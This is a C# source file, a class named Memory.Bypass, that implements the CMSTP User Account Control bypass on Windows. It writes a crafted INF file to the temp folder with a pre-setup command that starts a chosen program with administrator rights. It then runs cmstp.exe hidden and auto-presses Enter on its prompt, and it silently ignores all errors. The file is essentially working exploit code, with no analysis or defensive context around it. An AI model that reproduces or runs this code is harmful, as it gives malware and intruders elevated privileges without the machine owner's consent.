using System;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using System.Threading.Tasks;

// ReSharper disable SuggestVarOrType_BuiltInTypes
// ReSharper disable SuggestVarOrType_SimpleTypes
// ReSharper disable StringLiteralTypo
// ReSharper disable IdentifierTypo
// ReSharper disable once CheckNamespace

namespace Memory
{
    public static class Bypass
    {
        #region Native Imports
        private const string User32 = "user32.dll";

        [DllImport(User32)]
        private static extern bool SetForegroundWindow(IntPtr hwnd);

        [DllImport(User32)]
        private static extern bool ShowWindow(IntPtr hwnd, int cmdShow);

        [DllImport(User32)]
        private static extern bool PostMessage(IntPtr hWnd, uint msg, int wParam, int lParam);
        #endregion

        #region Keys
        private const int VkReturn = 0x0D;
        private const int WmKeydown = 0x100;
        #endregion

        public static int Timeout { get; set; } = 100;

        public static async Task Run(string filename)
        {
            try { await Process(filename); } catch { /*ignored*/}
        }
        public static async Task Process(string filename)
        {
            #region iniFile
            string ini = $@"
                [version]
                Signature=$chicago$
                AdvancedINF=2.5
                [DefaultInstall]
                CustomDestination=CustInstDestSectionAllUsers
                RunPreSetupCommands=RunPreSetupCommandsSection
                [RunPreSetupCommandsSection]
                powershell.exe ""Start-Process {filename} -Verb RunAs""
                taskkill /IM cmstp.exe /F
                [CustInstDestSectionAllUsers]
                49000,49001=AllUSer_LDIDSection, 7
                [AllUSer_LDIDSection]
                ""HKLM"", ""SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\CMMGR32.EXE"", ""ProfileInstallPath"", ""%UnexpectedError%"", """"
                [Strings]
                ServiceName=""Memory""
                ShortSvcName=""Memory""
                ";
            #endregion

            string inf = Path.Combine(Path.GetTempPath(), "CMSTP.inf");
            await File.WriteAllTextAsync(inf, ini);
            using Process p = new Process();
            p.StartInfo.FileName = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.System), "cmstp.exe");
            p.StartInfo.Arguments = $"/au \"{inf}\"";
            p.StartInfo.UseShellExecute = false;
            p.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
            p.StartInfo.CreateNoWindow = true;
            p.Start();
            while (p.MainWindowHandle == IntPtr.Zero)
            {
                await Task.Delay(Timeout);
            }
            if (SetForegroundWindow(p.MainWindowHandle) && ShowWindow(p.MainWindowHandle, 5))
            {
                await Task.Delay(Timeout);
                PostMessage(p.MainWindowHandle, WmKeydown, VkReturn, 0);
            }
            p.Close();
        }
    }
}
